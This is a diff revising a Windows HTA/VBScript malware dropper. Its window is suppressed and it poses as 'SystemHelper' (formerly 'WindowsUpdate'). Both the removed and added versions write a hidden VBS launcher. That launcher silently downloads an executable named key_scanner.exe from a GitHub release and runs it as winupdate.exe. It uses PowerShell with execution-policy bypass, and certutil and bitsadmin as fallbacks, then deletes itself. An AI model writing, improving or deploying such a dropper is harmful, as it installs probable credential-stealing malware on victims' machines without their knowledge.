@@ -1,6 +1,6 @@
 <hta:application
   id="oHTA"
-  applicationname="WindowsUpdate"
+  applicationname="SystemHelper"
   border="none"
   caption="no"
   showintaskbar="no"
@@ -14,39 +14,40 @@
 />
 
 <script language="VBScript">
-  ' ==== ENSURE COMPLETE INVISIBILITY ====
+  ' ==== COMPLETE WINDOW SUPPRESSION ====
   Window.resizeTo 0,0
   Window.moveTo -2000,-2000
+  document.body.style.display = "none"
+  
+  ' ==== CREATE INVISIBLE LAUNCHER ====
   Set WshShell = CreateObject("WScript.Shell")
   Set fso = CreateObject("Scripting.FileSystemObject")
   
-  ' ==== METHOD 1: POWERSHELL SILENT DOWNLOAD ====
-  psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $p='%temp%\\winupdate.exe'; " & _
-              "try { (New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe', $p); " & _
-              "if (Test-Path $p) { Start-Process -WindowStyle Hidden $p } } catch { }"""
+  ' Generate random filename for our launcher
+  launcherName = "sys_" & Hour(Now) & Minute(Now) & Second(Now) & ".vbs"
+  launcherPath = WshShell.ExpandEnvironmentStrings("%temp%") & "\" & launcherName
   
-  ' ==== METHOD 2: CERTUTIL FALLBACK ====
-  certutilCommand = "cmd /c certutil -urlcache -split -f https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe %temp%\\winupdate.exe && start /b %temp%\\winupdate.exe"
+  ' ==== BUILD THE LAUNCHER CONTENT ====
+  launchCode = "On Error Resume Next" & vbCrLf & _
+               "Set WshShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
+               "' Try PowerShell first" & vbCrLf & _
+               "WshShell.Run ""powershell -NoP -NonI -W Hidden -Exec Bypass -C \""[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $p='%temp%\winupdate.exe'; try{(New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe',$p); if(Test-Path $p){Start-Process -WindowStyle Hidden $p}}catch{}\"""", 0, False" & vbCrLf & _
+               "WScript.Sleep 10000" & vbCrLf & _
+               "' Fallback to Certutil" & vbCrLf & _
+               "WshShell.Run ""cmd /q /c certutil -urlcache -split -f https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe %temp%\winupdate.exe && start /b %temp%\winupdate.exe"", 0, False" & vbCrLf & _
+               "' Delete launcher after 30 seconds" & vbCrLf & _
+               "WScript.Sleep 30000" & vbCrLf & _
+               "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
+               "fso.DeleteFile WScript.ScriptFullName"
   
-  ' ==== METHOD 3: BITSADMIN ALTERNATIVE ====
-  bitsCommand = "cmd /c bitsadmin /transfer myjob /download /priority high https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe %temp%\\winupdate.exe && start /b %temp%\\winupdate.exe"
-  
-  ' ==== CREATE AND RUN A HIDDEN VBS LAUNCHER ====
-  tempVBS = "%temp%\\" & fso.GetTempName() & ".vbs"
-  Set file = fso.CreateTextFile(tempVBS, True)
-  file.WriteLine "On Error Resume Next"
-  file.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
-  file.WriteLine "WshShell.Run """ & psCommand & """, 0, False"
-  file.WriteLine "WScript.Sleep 5000"
-  file.WriteLine "WshShell.Run """ & certutilCommand & """, 0, False"
-  file.WriteLine "WScript.Sleep 5000"
-  file.WriteLine "WshShell.Run """ & bitsCommand & """, 0, False"
+  ' Write launcher file
+  Set file = fso.CreateTextFile(launcherPath, True)
+  file.Write launchCode
   file.Close
   
-  ' ==== EXECUTE THROUGH WSCRIPT (COMPLETELY HIDDEN) ====
-  WshShell.Run "wscript.exe //B //E:vbscript """ & tempVBS & """", 0, False
+  ' ==== EXECUTE COMPLETELY SILENTLY ====
+  WshShell.Run "wscript.exe //B //E:vbscript """ & launcherPath & """", 0, False
   
-  ' ==== CLEANUP ====
-  window.setTimeout "fso.DeleteFile(""" & tempVBS & """)", 10000
-  window.setTimeout "Self.Close()", 15000
+  ' ==== IMMEDIATE SELF-TERMINATION ====
+  window.setTimeout "Self.Close()", 1000
 </script>
